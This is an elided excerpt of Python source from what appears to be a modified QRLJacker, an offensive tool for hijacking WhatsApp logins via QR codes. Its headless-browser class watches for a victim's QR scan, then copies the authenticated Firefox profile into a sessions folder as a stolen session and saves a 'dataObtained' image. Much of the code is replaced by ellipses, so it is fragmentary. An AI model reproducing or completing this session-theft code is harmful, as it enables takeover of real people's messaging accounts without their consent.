...
import os, pickle, json, time, threading, functools, traceback, subprocess, shutil
...
#Copy moz:profile from 'tmp' to 'sessions':
def copy_session(source,dest):
    #try:
...
class headless_browsers:
        ...
        try:
            ...
            if controller:
                while self.browsers[module_name]["Status"] == "Success":
                    null = controller.find_elements('xpath', change_identifier)
                    time.sleep(1)
                    if not null:
    ...
    def check_img(self, module_name, button_xpath):
        ...
        if controller:
            while self.browsers[module_name]["Status"] == "Success":
                try:
                    btn = controller.find_element('xpath', button_xpath) # now it should work
    ...
    def save_localstorage(self,module_name):
        ...
        Imuge = Image.open(r"/home/kali/QRLJacker/core/www/whatsapp/full.png")
        Imuge.load()
        Imuge.save("/home/kali/QRLJacker/core/www/whatsapp/dataObtained.png")
    ...
    def save_profile(self, module_name):
        ...
        sessions_folder = os.getcwd() + '/sessions'
        tmp_folder_name = os.path.join(sessions_folder,time.ctime().replace(" ","-"))
        browser = self.browsers[module_name]["Controller"]
        profile_file_name = os.path.join( "profiles",time.ctime().replace(" ","-")) + ".pf"
        profile_file = open(profile_file_name,"w")
        profile_file.write(tmp_folder_name)
        profile_file.close()
        ...
        json.dump(sessions, f, indent=2)
        f.close()
        tmp_folder = browser.capabilities['moz:profile']
        tmp_folder2 = os.path.join(sessions_folder,tmp_folder)
        time.sleep(2)
        subprocess.call(['cp', '-r', tmp_folder, sessions_folder])
        time.sleep(1)
        subprocess.call(['mv', '-T', tmp_folder2, tmp_folder_name])
        shutil.rmtree(sessions_folder+tmp_folder.replace('/tmp',''))
        status("Session saved successfully")
        Imuge = Image.open(r"/home/kali/QRLJacker/core/www/whatsapp/full.png")
        Imuge.load()
        Imuge.save("/home/kali/QRLJacker/core/www/whatsapp/dataObtained.png")
